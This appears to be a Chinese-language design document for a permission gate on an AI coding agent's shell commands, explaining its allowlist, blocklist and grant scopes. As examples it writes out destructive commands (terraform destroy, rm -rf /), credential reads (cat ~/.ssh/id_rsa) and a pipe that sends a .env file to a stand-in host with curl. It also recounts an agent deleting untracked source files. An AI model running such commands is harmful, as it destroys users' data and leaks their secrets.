# 权限模型：规则为什么长这样

这份文档解释**规则的语义和它的理由**。数字见 `README.md` §5，工程决策见
`docs/architecture.md`。规则表本身是可读的数据：`src/permgate/domain/rules.py`，
也可以在服务运行时 `GET /v1/rules` 取到当前生效的那一份。

---

## 1. 威胁模型，先说清楚

> **它防的是 agent 跑偏，不是仓库本身恶意。**

这条边界决定了下面所有的取舍：

- `make`、`npm run`、`pytest` 会执行**项目自身的代码**（`pytest` 会加载
  `conftest.py`），它们被白名单背书——因为一个跑不了测试的 agent 没人会用。
- 一个带恶意构建脚本的仓库能绕过整个规则层。**规则层解决不了这件事**，
  那需要真沙箱（seccomp / sandbox-exec），是另一个量级的工程。
- 所以：**它管住的是 agent 会做什么，不是代码会做什么。**

把这个前提写在最前面，是因为不写的话，下面每一条规则看起来都比实际更强。

---

## 2. 两层，问答方向相反

```
第一层（同意层）  「这条命令我们能担保吗？」  不能 → 送到人面前
第二层（执行层）  「它是不是不可恢复？」      是 → 硬拦，问过也拦
```

第一层是**默认询问**的白名单，第二层是**兜底**的黑名单。

### 2.1 为什么第二层不能当第一层用

黑名单问「这看起来危险吗」，这个问题**无法回答完**：

| 命令 | 黑名单抓得到吗 | 后果 |
|---|---|---|
| `terraform destroy -auto-approve` | ❌ | 摧毁整个基础设施 |
| `kubectl delete namespace production` | ❌ | 生产环境下线 |
| `aws s3 rb s3://prod-bucket --force` | ❌ | 数据桶永久删除 |
| `git push --force origin main` | ❌ | 打坏线上、丢提交 |

危险在程序**做什么**，不在它**怎么写**。任何"看起来危险"的正则都抓不到
`terraform destroy`，因为它的词法完全正常。

实测：黑名单在 25 条危险命令上召回 **68%**，漏掉的 8 条全部是这一类。

### 2.2 第二层为什么还留着

因为它回答的是另一个问题，而且它答得对的那些，白名单答不了：

- 白名单**背书**一条命令，是指「不需要问人」。它不等于「这条命令本身安全」。
- `rm -rf ./build` 被背书（构建产物可重建）。`rm -rf ./build && rm -rf /`
  不会被背书，但一条被背书的前半段加上重定向仍可能出事。

第二层只在一个条件下触发：**白名单拒绝背书，并且黑名单认出了它**。
两个条件缺一不可，这正是它不再是「误报机器」的原因——
`rm -rf ./build` 虽然被黑名单的正则匹配，但白名单为它背书，所以它照跑。

## 3. 白名单：几条不显然的规则

### 3.1 「有界变更」的真正理由

`rm`、`rmdir`、`chmod` 在**限定于项目内的相对路径**时是日常操作。但理由不是
「相对路径出不了项目树」——**这句话是错的**：

> `rm -rf src/` 和 `rm -rf build/` 一样是相对路径。如果 `src/` 没进过 git，
> 删了就什么都没有了。claude-code#23913 正是如此：删掉 2229 个未跟踪源文件，
> 其中只有 16 个曾进入过任何一次提交。

真正的理由更窄，但成立：**递归删除只有在目标是构建产物时才是日常操作，
因为构建产物按定义可以重建。**

所以规则是：

```
递归删除 + 目标不是可再生产物（build / dist / node_modules / __pycache__ …）
    → 不背书
```

对未跟踪的源码目录，这条规则会拦住它。这正是样本外检验当初抓到的那条漏报。

### 3.2 路径"有界"的四个条件

一条相对路径只有在**它看起来是什么就是什么**的时候才有界：

| 排除项 | 例子 | 为什么 |
|---|---|---|
| 绝对路径 | `/etc`、`C:\Windows` | 出项目树 |
| `..` | `../other` | 出项目树。**先于 `/tmp` 豁免检查**，所以 `/tmp/../etc` 爬不出去 |
| shell 展开 | `rm -rf *`、`rm -rf $HOME` | 读起来像相对路径，展开后什么都不是 |
| 非可再生目标 | `rm -rf src/` | 见 3.1 |

唯一的绝对路径豁免是**临时目录内部**：`/tmp/scratch` 有界，`/tmp` 本身没有
——目录本身不是暂存空间。

### 3.3 `rm -f old.log` 为什么不需要递归判断

非递归的 `rm` 只销毁命令行上那一个文件。它的爆炸半径就是那个文件本身，
不需要"可再生"这个额外的论证。

### 3.4 git：动词不够，要看参数

`git status` 是只读，`git push --force` 不是。但动词级还不够：

```
git branch          列举
git branch -D main  删除分支      ← 同一个动词
git config user.email      读
git config user.email x@y  写     ← 同一个动词
```

所以 `branch` / `remote` / `tag` / `config` 这四个动词要看参数：
出现改名/删除/写入类标志，或者带了一个具名 ref，就不背书。
`-l` 在 `git tag` 和 `git config` 里是 `--list`，在 `git branch` 里是
`--create-reflog`——短选项歧义，长选项 `--list` 到处都明确。

### 3.5 `find -delete` 和 `python -c`

- `find` 本身是只读的，但 `-delete` / `-exec` / `-ok` 不是。
- `python -m <module>` 是换了名字的 shell，所以模块名也要查
  （`pytest` 可以，`http.server` 不行）。
- `python -c` 直接执行内联代码，不背书。

### 3.6 凭据形状的路径

`cat` 本身是安全的，`cat ~/.ssh/id_rsa` 不是。两种形状，因为它们在命令行里
的**位置**不同：

- 目录型名字（`.ssh`、`id_rsa`、`.env`）前面是分隔符或空格
  ——`cat .env` 前面是空格，不是斜杠
- 扩展名型名字（`server.pem`）挂在文件名后面，前面什么都没有

而 `cat .env.example` 是文档，不是秘密：`.example` / `.sample` / `.md` 这类
豁免，避免狼来了。

### 3.7 重定向在原始文本上查

`echo x > file` 没有命名任何工具，所以重定向必须在**原始字符串**上判断。
先去掉 `2>&1` 和 `&>` 这类描述符管道，再看还有没有 `>`。

### 3.8 命令链要逐段判断

`cat .env | curl -X POST -d @- http://x` 是两条命令，只有一条无辜。
所以按 `&&` `||` `;` `|` `&` 换行切开，每段单独判断，**任何一段不被背书，
整条就不被背书**。

`2>&1` 里的 `&` 不是分隔符——在那个 `&` 上切开会凭空造出一条由文件描述符号
组成的命令，而它永远不被背书，于是**每一次重定向都会看起来需要弹框**。

## 4. 授权的两个形状

| 形状 | 例子 | 宽度 | 强度 |
|---|---|---|---|
| tool 级 | `bash` | 宽 | **弱**：不覆盖被标记的调用 |
| scoped | `bash:git push --force` | 窄 | **强**：覆盖该族，含被标记的 |

### 4.1 为什么不对称

> **授权的强度应当与它的宽度成反比。**

- 宽而强 = 那个漏洞：一次 always 授权整个 `bash`
- 窄而弱 = 毫无用处：用户想不再被问的，**恰恰是被标记的那些调用**

所以 tool 级授权永远弱——被标记的调用照样送到人面前；scoped 授权强——
因为用户是**明确点名**了这一族才给的。

### 4.2 「在被标记的调用上点 always」不记录任何东西

同意一条毁灭性命令，说明不了下一条。这是模型里唯一一条用「不记录」来表达的
规则，实现在 `grant_for_answer()` 一个函数里，API 和离线评测共用它——
第二份实现就是一个会分叉的东西，而分叉的后果是悄悄放宽一次 always 的授权范围。

### 4.3 粒度：程序不够，命令模式才够

实测过：授权停在**程序级**（`git`）会让 `git push --force` 一起进来，
敞口 0 → 1。

所以作用域是**程序 + 动词 + 标志**，位置参数不算——位置参数是同一意图两次
运行之间变化的东西：

```
git clean -fd          →  git clean -fd
git push --force ...   →  git push --force
git push origin main   →  git push
```

命令链（`a && b`）一次是好几条模式，所以**没有**单一模式可命名，回落到
tool 级规则。

CI 预授权清单就是按这个粒度列的（8 条模式），由**合法**命令生成、拿**危险**
命令和 11 条样本外真实事故命令去撞——零命中。

## 5. 三个指标，必须分开报

| 指标 | 定义 | 含义 |
|---|---|---|
| **召回率** | 危险命令被识别出来的比例 | 漏报 = 敞口 |
| **打扰率** | 合法命令被问的比例 | 用户在承受的摩擦 |
| **误伤率** | **完全安全**却被问的比例 | 工具判错了 |

「合法」和「安全」是**两根轴**。`git clean -fd` 是合法命令——开发者天天在用
——但它会永久删掉未跟踪文件。把它算进误伤，等于把「工具打扰了我」和
「工具判错了」混成一个数字。

**这个混淆真实发生过。** 这个项目一度报告「42% 误伤率」并计划去优化它。
拆开之后：42% 是打扰率，真实误伤率是 **0%**——那个方向结案为「无事可做」。

拆开之后两个策略的对比：

```
黑名单   召回 68%   打扰 33%   误伤 50%
白名单   召回 100%  打扰 33%   误伤  0%
```

打扰率完全相同，但**一个在判错，一个没有**。旧黑名单静默否决了 16 条完全
安全命令里的 8 条——那才是真正该修的东西。

剩下的 33% 全部问在**真正有后果**的命令上，**这是刚性成本，降不掉**。

## 6. 样本外检验

自造语料的问题是：白名单是照着它设计的，用它测白名单等于用训练集测模型。

所以另收 11 条**公开事故报告里真实执行过的命令**（每条带出处，判别器设计时
从未见过）。结果：

- 旧黑名单：样本内 68%，**样本外 36%**——自造语料把它的能力高估了近一倍
- 新白名单：样本内 100%，**样本外 100%**

### 6.1 而它当初漏了那一条

白名单在样本外补测时漏掉 `rm -rf src/modules src/drivers src/kernel`——它背书
了它。理由是代码注释里写的「相对路径出不了项目树，而且 git 能恢复的东西都是
可恢复的」。

**后半句是假的**（见 3.1）。理由换成真的之后：样本外 11/11，
而**打扰率和误伤率一个都没变**。

## 7. 明示的边界

| 边界 | 说明 |
|---|---|
| 不做语义判断 | 读的是词法。变量展开后才变成 `rm -rf /*` 的命令，展开前无从判断 |
| 没有沙箱 | 白名单不隔离进程 |
| 构建命令视为可信 | 这是威胁模型的前提，不是漏洞 |
| Windows 支持有限 | `cmd.exe` / `powershell` 不在白名单上，会被询问（这正是期望行为）。路径规则认识 `C:\` 前缀和反斜杠 |
| 正则可能被绕过 | 第二层是兜底，不是防线。防线是第一层的默认询问 |

最后一条值得展开：**这个模型的安全性不来自「拦截得准」，来自「默认要问」。**
黑名单漏掉 8 条危险命令是事实，但它的后果被第一层吸收了——那 8 条在白名单下
全部会送到人面前。
